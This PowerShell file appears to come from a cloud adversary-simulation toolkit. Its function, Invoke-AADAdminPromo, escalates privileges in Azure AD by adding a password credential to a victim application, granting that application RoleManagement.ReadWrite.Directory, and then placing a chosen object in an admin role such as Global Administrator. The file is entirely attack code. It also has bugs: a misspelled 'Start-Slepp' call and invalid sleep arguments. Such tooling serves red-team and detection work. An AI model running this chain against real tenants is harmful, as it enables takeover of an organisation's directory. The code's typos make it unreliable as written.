$ErrorActionPreference = "Stop"

function Invoke-AADAdminPromo {
    <#
    .SYNOPSIS
    A script to elevate to an administrator role after a Role Management Directory Role Permission Grant.

    Author: Roberto Rodriguez (@Cyb3rWard0g)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    A script to Grant the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission to an Azure service principal before being used to add an Azure AD object or user account to an Admin directory role (i.e. Global Administrators).

    .PARAMETER appSPObjectId
    Id of the victim's Azure AD Application Service Principal object.

    .PARAMETER appClientId
    Client Id of the victim's Azure AD Application.

    .PARAMETER appObjectId
    Object Id of the victim's Azure AD Application.

    .PARAMETER directoryObjectId
    Id of the directory object. A directory object represents an Azure Active Directory object. (application, group, user, service principal, etc.

    .PARAMETER templateRoleId
    ID of the Azure AD Directory Role Id. Example: Cloud AppAdmin Template Role Id: 158c047a-c907-4556-b7ef-446551a6b5f7 or Global Admin Template Role Id: 62e90394-69f5-4237-9190-012177145e10.

    .PARAMETER accessToken
    Access token used to access the API.

    .LINK
    https://www.powershellgallery.com/packages/CloudKatanaAbilities
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$appSPObjectId,

        [Parameter(Mandatory=$true)]
        [string]$appClientId,
        
        [Parameter(Mandatory=$true)]
        [string]$appObjectId,

        [Parameter(Mandatory=$true)]
        [string]$directoryObjectId,

        [Parameter(Mandatory=$true)]
        [string]$templateRoleId,

        [parameter(Mandatory = $true)]
        [String]$accessToken
    )

    # Step 1
    # Add a new password credential to a victim's AAD Application to get an access token using the new creds and grant a new permission
    $appPassword = New-CKAzADAppPassword -appObjectId $appObjectId -accessToken $accessToken

    Start-Sleep 120s 
    
    # Step 2
    # Get an access token using the new credentials
    $accessTokenOne = Get-CKAccessToken -ClientId $appClientId -GrantType client_credentials -AppSecret $appPassword.secretText

    # Step 3
    # Grant RoleManagement.ReadWrite.Directory App Role to victim's AAD Application (Service Principal) to elevate privileges
    Grant-CKAzADAppPermissions -spObjectId $appSPObjectId -resourceName 'Microsoft Graph' -permissionType Application -permissions @("RoleManagement.ReadWrite.Directory") -accessToken $accessTokenOne

    Start-Slepp 120s

    # Step 4
    # Get a new access token with new role assignment from the same victim's AAD Application using the new creds.
    $accessTokenTwo = Get-CKAccessToken -ClientId $appClientId -GrantType client_credentials -AppSecret $appPassword.secretText
    (Read-CKAccessToken -Token $accessTokenTwo).roles

    # Step 5
    # Add an Azure Active Directory object (Service principal, user, etc.) to an Admin Role (i.e. Glocal Administrator)
    Add-CKAzADDirectoryRoleMember -directoryRoleTemplateId $templateRoleId -directoryObjectId $directoryObjectId -accessToken $accessTokenTwo
}